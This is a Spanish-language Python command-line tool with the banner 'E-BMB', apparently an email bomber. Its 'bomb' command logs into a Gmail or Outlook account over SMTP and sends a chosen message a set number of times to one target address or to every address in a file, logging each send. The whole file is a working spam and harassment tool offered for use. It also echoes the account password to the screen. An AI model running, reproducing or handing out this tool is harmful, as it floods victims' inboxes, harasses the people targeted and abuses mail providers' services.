import datetime
import smtplib
import time
import os

eWhile = False
vEbomb = '1'
banner = '     ____.________  .___\n    |    |\______ \ |   |\n    |    | |    |  \|   |\n/\__|    | |    `   \   |\n\________|/_______  /___|\n                  \/ v1 E-BMB\n\n'
cHelp = 'log                 - Mostrar el registro\n                     --clear Limpiar el archivo de registro\n                     --add   Añador un texto a el registro\n\nclear               - Limpiar la terminal\n\nbomb                - Iniciar un ataque de spam\n\nversion             - Ver la version de el archivo\n'

while(eWhile == False):
    log = ''
    print(banner)
    while(True):
        try:
            command = input('Comando >> ').lower().split()
            if(command[0] == 'help'):
                print(cHelp)
            elif(command[0] == 'log'):
                if(os.path.isfile('log.txt')):
                    if(len(command) == 1):
                        with open('log.txt', 'r') as log:
                            print(log.read())
                        input('Preciona enter para cerrar el log')
                        break
                    elif(command[1] == 'clear' or command[1] == 'c'):
                        with open('log.txt', 'w') as log:
                            log.write('')
                        break
                    elif(command[1] == 'add' or command[1] == 'a' or command[1] == '--add' or command[1] == '-a'):
                        with open('log.txt', 'a') as log:
                            for text in command[1:]:
                                log.write('{}'.format(text))
                        break
                else:
                    print('[!] No existe un archivo de log, se creara uno')
                    with open('log.txt', 'w') as log:
                        log.write('Log creado ' + str(datetime.datetime.now()))
            elif(command[0] == 'clear' or command[0] == 'cls'):
                try:
                    os.system('cls')
                except:
                    os.system('clear')
            elif(command[0] == 'version'):
                print('v' + vEbomb)
            elif(command[0] == 'bomb'):
                vMail = input('[+] Correo a atacar: ')
                vList = 'null'
                if not('@' in vMail):
                    if(os.path.isfile(vMail)):
                        with open(vMail, 'r') as vFile:
                            vList = vFile.read().split()
                    else:
                        print('Direccion no valida [{}]'.format(vMail))
                        break
                uMail = input('[+] Correo a usar: ')
                uPass = input('[+] Clave [{}]: '.format(uMail))
                vMess = input('[+] Mensaje: ')
                vNume = input('[+] Cantidad: ')
                vTipo = input('[+] (Gmail/Outlook): ').lower()
                if(vTipo == 'gmail'):
                    cMail = smtplib.SMTP('smtp.gmail.com', 587)
                elif(vTipo == 'outlook'):
                    cMail = smtplib.SMTP('smtp.office365.com', 587)
                try:
                    cMail.ehlo()
                    cMail.starttls()
                    cMail.login(uMail, uPass)
                except:
                    print('[-] No se pudo acceder a la cuenta [{}] [{}]'.format(uMail, uPass))
                print('[+] Se accedio a la cuenta [{}] [{}]'.format(uMail, uPass))
                if(vList == 'null'):
                    for x in range(0, int(vNume)):
                        try:
                            cMail.sendmail(uMail, vMail, vMess)
                            print('[!] Mensage [{}] enviado'.format(x + 1))
                            log += '[{}] Mensage No.{} enviado a [{}]\n'.format(datetime.datetime.now(), x, vMail)
                            time.sleep(1)
                        except Exception as exception:
                            print('[-] Ocurrio un error al enviar el mensaje No.{}\nDetalles: {}'.format(x + 1, exception))
                else:
                    for vMailList in vList:
                        for x in range(0, int(vNume)):
                            try:
                                cMail.sendmail(uMail, vMailList, vMess)
                                print('[!] Mensage [{}] enviado a [{}]'.format(x + 1, vMailList))
                                log += '[{}] Mensage No.{} enviado a [{}]\n'.format(datetime.datetime.now(), x, vMailList)
                                time.sleep(1)
                            except Exception as exception:
                                print('[-] Ocurrio un error al enviar el mensaje No.{}\nDetalles: {}'.format(x + 1, exception))
                        log += '\n'
                        print('\n')
                with open('log.txt', 'a') as fLog:
                    fLog.write(log)
                cMail.close()
                try:
                    os.system('cls')
                except:
                    os.system('clear')
                break
        except KeyboardInterrupt:
            try:
                os.system('cls')
            except:
                os.system('clear')
            print('[-] Interrupcion de el usuario [CTRL + C]')
            eWhile = True
            break